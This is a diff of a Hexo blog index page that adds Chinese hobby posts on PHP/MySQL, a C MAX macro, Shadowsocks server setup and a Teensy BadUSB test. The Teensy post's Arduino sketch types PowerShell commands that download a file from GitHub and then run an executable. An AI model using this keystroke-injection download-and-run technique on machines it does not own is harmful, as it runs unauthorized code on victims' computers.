@@ -9,7 +9,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://47.106.74.249/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en">
 <meta name="twitter:card" content="summary">
@@ -54,7 +54,7 @@
         <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://47.106.74.249"></form>
       </div>
     </div>
   </div>
@@ -88,7 +88,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/hello-Hexo/" data-id="cjz70mdvy0000gkoyx2xqqoi6" class="article-share-link">Share</a>
+      <a data-url="http://47.106.74.249/2019/08/11/hello-Hexo/" data-id="cjz9oc5cs0005asoy3kwjjjre" class="article-share-link">Share</a>
       
       
     </footer>
@@ -98,12 +98,16 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-Teensy2-0Test" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/08/11/hello-world/" class="article-date">
-  <time datetime="2019-08-11T13:28:02.778Z" itemprop="datePublished">2019-08-11</time>
+    <a href="/2019/01/28/Teensy2-0Test/" class="article-date">
+  <time datetime="2019-01-28T15:23:15.000Z" itemprop="datePublished">2019-01-28</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Embedded/">Embedded</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -112,7 +116,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/11/hello-world/">Hello World</a>
+      <a class="article-title" href="/2019/01/28/Teensy2-0Test/">Teensy2.0Test</a>
     </h1>
   
 
@@ -120,26 +124,322 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <p>头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。</p>
+<h2 id="Teensy"><a href="#Teensy" class="headerlink" title="Teensy"></a>Teensy</h2><p>这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。</p>
+<h2 id="Arduino-和-Teensyduino"><a href="#Arduino-和-Teensyduino" class="headerlink" title="Arduino 和 Teensyduino"></a>Arduino 和 Teensyduino</h2><p>自行安装。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>测试环境为Win10，使用powershell。</p>
+<p>使用开发板实现文件自动下载运行。</p>
+<p>写入代码：</p>
+<pre><code>void setup() { 
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+delay(5000);//延迟5000ms，便于调试和电脑处理
+Keyboard.press(KEY_LEFT_CTRL);//Press Ctrl
+Keyboard.press(KEY_ESC);//Press Esc
+Keyboard.releaseAll();//释放
+delay(500);
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+delay(5000);
+Keyboard.print(&quot;powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/OnlyMyRailgunTest.wav&apos;, &apos;D:\\OnlyMyRailgunTest.wav&apos;);exit;&quot;);
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+delay(5000);
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+delay(15000);
+Keyboard.press(KEY_LEFT_CTRL);
+Keyboard.press(KEY_ESC);
+Keyboard.releaseAll();
+delay(500);
+
+delay(5000);
+Keyboard.print(&quot;powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/Project1.exe&apos;, &apos;D:\\Project1.exe&apos;);start D:\\Project1.exe;&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+
+
+delay(30000);
+
+}
+
+void loop() {}</code></pre><p>其中这两段话：</p>
+<pre><code>powershell $client = new-object System.Net.WebClient;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/
+OnlyMyRailgunTest.wav&apos;, &apos;D:\\OnlyMyRailgunTest.wav&apos;);
+exit;
+
+powershell $client = new-object System.Net.WebClient;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/Project1.exe&apos;, &apos;D:\\Project1.exe&apos;);
+start D:\\Project1.exe;</code></pre><p>利用powershell从github上下载事先准备好的可执行文件。我自己写了一个小程序，无限播放Only my railgun的片段，因为github上最大只允许25M，playsound又只能播放WAV，又不想弄其它的库函数或者之类的。</p>
+<p>运行效果：</p>
+<p><img src="/pic/201901281.png" alt></p>
+<p>顺便吐槽，国内github速度是真的慢。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/hello-world/" data-id="cjz70mdw90001gkoybny2ccss" class="article-share-link">Share</a>
+      <a data-url="http://47.106.74.249/2019/01/28/Teensy2-0Test/" data-id="cjz9oc5cu0006asoyhnpal9w9" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Embedded/">Embedded</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Perfect-Hair-Programming" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/07/29/Perfect-Hair-Programming/" class="article-date">
+  <time datetime="2018-07-29T07:12:16.000Z" itemprop="datePublished">2018-07-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/DateBase/">DateBase</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/29/Perfect-Hair-Programming/">Perfect Hair Programming</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇博客的原因主要是记录下自己在学习PHP过程中遇到的一些问题。一方面也可以让自己坚持下来，为MySQL和AmazeUI的学习做好准备。</p>
+<h1 id="7月29日"><a href="#7月29日" class="headerlink" title="7月29日"></a>7月29日</h1><h4 id="多维数组的问题"><a href="#多维数组的问题" class="headerlink" title="多维数组的问题"></a>多维数组的问题</h4><pre><code>&lt;?php
+$List = array
+(
+    array(12,100,96),
+    array(3,60,59),
+    array(23,110,100)
+);
+$i=1;
+echo &quot;$List[$i][1]&quot;;
+?&gt;</code></pre><p>运行时会显示 <code>Array to string conversion ……</code> 这样的问题。而一维数组没有发生问题。</p>
+<p>多维数组，下标不是简单的数值的数组需要用<code>{}</code>起来。或者用temp，或者不使用引号都可以。</p>
+<pre><code>//修改后
+echo &quot;{$List[$i][1]}&quot;;
+echo $List[$i][1];
+$tmp=$List[$i][1];
+echo &quot;$tmp&quot;;</code></pre><h1 id="7月30日"><a href="#7月30日" class="headerlink" title="7月30日"></a>7月30日</h1><h4 id="Apache-PHP-MySQL-phpMyAdmin"><a href="#Apache-PHP-MySQL-phpMyAdmin" class="headerlink" title="Apache+PHP+MySQL+phpMyAdmin"></a>Apache+PHP+MySQL+phpMyAdmin</h4><p>超级多坑点，安装过程简直要爆炸。弄了一天也没有完全弄好，感觉要崩溃了。还是明天来弄吧。</p>
+<h4 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h4><p>简单的了解了一下，可以看懂一些简单的E-R图了。</p>
+<h1 id="7月31日"><a href="#7月31日" class="headerlink" title="7月31日"></a>7月31日</h1><h4 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h4><p>终于安装好了，原来是<code>mysql.exe</code>的权限问题，调整了权限之后可以正常使用了。</p>
+<p><img src="/pic/2018073101.png" alt></p>
+<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>学习中，熟悉了数据库的基本操作。</p>
+<h1 id="8月1日"><a href="#8月1日" class="headerlink" title="8月1日"></a>8月1日</h1><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><p>继续熟悉基本语法。学习视图ing</p>
+<h1 id="8月2日"><a href="#8月2日" class="headerlink" title="8月2日"></a>8月2日</h1><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p>了解视图，存储过程，索引，触发器等基础概念</p>
+<h4 id="MySQL-PHP"><a href="#MySQL-PHP" class="headerlink" title="MySQL+PHP"></a>MySQL+PHP</h4><p>看了一些mysqli，感觉自己可以看的懂PHP的源码了，开心23333</p>
+<h1 id="8月3日"><a href="#8月3日" class="headerlink" title="8月3日"></a>8月3日</h1><h4 id="phpMyAdmin-1"><a href="#phpMyAdmin-1" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h4><p>前面没解决的坑后来还是要填的啊，遇到这种情况就要重新登陆MySQL <code>mysql -uroot -p</code> 当然如果你密码输错了当我没有说。</p>
+<p><img src="/pic/2018080301.png" alt></p>
+<h4 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP+MySQL"></a>PHP+MySQL</h4><p>做了一个极其简陋登陆程序，下限超乎你的想象这里就不放出来了。想的时候容易做到时候一堆坑啊。果然产品经理和程序员之间的矛盾是不可调和的2333</p>
+<h1 id="8月17日"><a href="#8月17日" class="headerlink" title="8月17日"></a>8月17日</h1><p>情人节。比赛终于结束了，期盼着两天之后有好的结果吧</p>
+<h1 id="8月19日"><a href="#8月19日" class="headerlink" title="8月19日"></a>8月19日</h1><p>二等奖，感觉还行23333</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://47.106.74.249/2018/07/29/Perfect-Hair-Programming/" data-id="cjz9oc5ce0000asoy7b48o4so" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DateBase/">DateBase</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Max-Function-C" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/07/07/Max-Function-C/" class="article-date">
+  <time datetime="2018-07-07T09:34:45.000Z" itemprop="datePublished">2018-07-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Programming/">Programming</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/07/Max-Function-C/">Max Function(C)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="C语言使用宏定义取最大值"><a href="#C语言使用宏定义取最大值" class="headerlink" title="C语言使用宏定义取最大值"></a>C语言使用宏定义取最大值</h1><p>使用宏定义取两个值中最大值是一个很简单的题目，随手写下：</p>
+<pre><code>#define MAX(x,y) ((x)&gt;(y)?(x):(y))</code></pre><p>这样写可以应付大多数的情况了，但在某些情况下还是会出现问题，比如说：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#define MAX(x,y) ((x)&gt;(y)?(x):(y))
+int main(){
+    int i=4;
+    int j=5;
+    printf(&quot;max=%d，i=%d,j=%d&quot;,MAX(i++,j++),i,j);
+}</code></pre><p>输出的结果是：</p>
+<pre><code>max=6,i=5,j=7</code></pre><p>这和我们想象的不太一样，j的值应该是6。我们把<code>MAX(i++,j++)</code>带入看下</p>
+<pre><code>printf(&quot;max=%d，i=%d,j=%d&quot;,((i++)&gt;(j++)?(i++):(j++)),i,j);</code></pre><p>我们可以看到，<code>j++</code>这条命令被执行了两次，导致j的值为7，为了解决这个问题，我们修改下MAX。</p>
+<pre><code>#define MAX(x,y) ({\
+typeof(x) _x=x;\
+typeof(y) _y=y;\
+_x&gt;_y?_x:_y;\
+})</code></pre><p>用<code>typeof</code>获取x,y的数据类型，用_x和_y暂时保存x,y的值。避免了上面出现的问题。又或者是：</p>
+<pre><code>#define MAX(x,y) ({\
+typeof(x) _x=x;\
+typeof(y) _y=y;\
+(void)(&amp;_x==&amp;_y);\
+_x&gt;_y?_x:_y;\
+})</code></pre><p>抛出Warning解决类型不同的问题（不是很理解这句话<code>(void)(&amp;_x==&amp;_y);</code>）。</p>
+<p>比较相同类型的值时，也可以这样写（虽然我感觉没有上面的好用）：</p>
+<pre><code>#define MAX(type,x,y) ({\
+type _x=x;\
+type _y=y;\
+_x&gt;_y?_x:_y;\
+})</code></pre><p>大概就是这样，关于宏定义取最大值的问题，欢迎与我讨论</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://47.106.74.249/2018/07/07/Max-Function-C/" data-id="cjz9oc5cr0004asoyrnzxwc2r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Sever-multi-user-confliguration" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/23/Sever-multi-user-confliguration/" class="article-date">
+  <time datetime="2018-06-23T15:19:22.000Z" itemprop="datePublished">2018-06-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sever/">Sever</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/23/Sever-multi-user-confliguration/">Sever multi-user confliguration</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="服务器多用户配置"><a href="#服务器多用户配置" class="headerlink" title="服务器多用户配置"></a>服务器多用户配置</h2><p>今天，为了让一个朋友科学上网，我修改了服务器配置，添加了多个端口，实现了让不同用户用同一个服务器上网的功能，本文使用的服务器为 CentOS 7 x64。</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>打开PuTTY，填入IP，打开服务器，使用Xshell同理。</p>
+<p><img src="/pic/2018062301.png" alt></p>
+<p>填写账号密码，登陆，输入命令，创建配置文件。</p>
+<pre><code>vi /etc/shadowsocks.json</code></pre><p>按i键，将内容修改为</p>
+<pre><code>{
+ &quot;server&quot;:&quot;0.0.0.0&quot;, 
+&quot;local_address&quot;: &quot;127.0.0.1&quot;,
+&quot;local_port&quot;:1080,
+&quot;port_password&quot;: {
+      &quot;8001&quot;: &quot;foobar1&quot;,    #端口号，密码
+      &quot;8002&quot;: &quot;foobar2&quot;
+},
+ &quot;timeout&quot;:300,
+&quot;method&quot;:&quot;aes-256-cfb&quot;,
+ &quot;fast_open&quot;: false
+}</code></pre><p>按ESC退出，输入:wq保存文件。</p>
+<p>有的服务器有防火墙</p>
+<pre><code>firewall-cmd --    zone=public --add-port=8001/tcp --permanent</code></pre><p>这里8001是你的端口号，根据你设置的端口进行修改。</p>
+<p>如果你想查看已经开启的端口，输入：</p>
+<pre><code>firewall-cmd --list-ports</code></pre><p>查看已开启的端口。</p>
+<p>重启防火墙：</p>
+<pre><code>firewall-cmd --reload</code></pre><p>查看端口号是否开启，运行命令：</p>
+<pre><code>firewall-cmd --query-port=8001/tcp</code></pre><p>大功告成。</p>
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>我使用<a href="https://www.vultr.com/" target="_blank" rel="noopener">vultr</a>的服务器进行科学上网，每月有500G流量，正常情况基本用不完。开启多端口后，让你的同学朋友们下载Shadowsocks，配置一下，就让他们能够享受科学上网了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://47.106.74.249/2018/06/23/Sever-multi-user-confliguration/" data-id="cjz9oc5cj0001asoy2jlk7tpd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Server/">Server</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/17/hello-world/" class="article-date">
+  <time datetime="2018-06-17T04:47:28.000Z" itemprop="datePublished">2018-06-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Others/">Others</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/17/hello-world/">Hello World!</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h2><p>欢迎 <a href="http://nanfengx.github.io" target="_blank" rel="noopener">NanFengX</a>! 点击 <a href="https://github.com/NanFengx/NanFengX.github.io" target="_blank" rel="noopener">github</a> 获取更多的信息。</p>
+<h2 id="个人主页"><a href="#个人主页" class="headerlink" title="个人主页"></a>个人主页</h2><p>一直想搭建个人主页，但是由于各种原因没有实现，今天一时兴起，开始着手做这件事情</p>
+<p>搭建的过程比想象中要顺利，前后大约花费了4个小时。靠着<a href="http://godweiyang.com/" target="_blank" rel="noopener">阳神</a>的博客<a href="http://godweiyang.com/2018/04/13/hexo-blog/" target="_blank" rel="noopener">超详细Hexo+Github博客搭建小白教程</a>和一些网上的教程完成了我的个人主页。  </p>
+<p>这里应该会是我发表一些博客的地方了。有时候可能还会发一些自己的心情。自己的网站可以按照自己的想法来实现，不用太去考虑其他的一些问题了。</p>
+<p>More information：<a href="https://github.com/NanFengx/NanFengX.github.io" target="_blank" rel="noopener">github</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://47.106.74.249/2018/06/17/hello-world/" data-id="cjz9oc5db000rasoyasomczb5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Others/">Others</a></li></ul>
+
     </footer>
   </div>
   
@@ -154,18 +454,39 @@
           <aside id="sidebar">
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DateBase/">DateBase</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Embedded/">Embedded</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Others/">Others</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Programming/">Programming</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Sever/">Sever</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DateBase/">DateBase</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Embedded/">Embedded</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Others/">Others</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Server/">Server</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C/" style="font-size: 20px;">C</a> <a href="/tags/DateBase/" style="font-size: 10px;">DateBase</a> <a href="/tags/Embedded/" style="font-size: 10px;">Embedded</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/Others/" style="font-size: 10px;">Others</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Server/" style="font-size: 10px;">Server</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li></ul>
     </div>
   </div>
 
@@ -182,7 +503,19 @@
           </li>
         
           <li>
-            <a href="/2019/08/11/hello-world/">Hello World</a>
+            <a href="/2019/01/28/Teensy2-0Test/">Teensy2.0Test</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/29/Perfect-Hair-Programming/">Perfect Hair Programming</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/07/Max-Function-C/">Max Function(C)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/23/Sever-multi-user-confliguration/">Sever multi-user confliguration</a>
           </li>
         
       </ul>
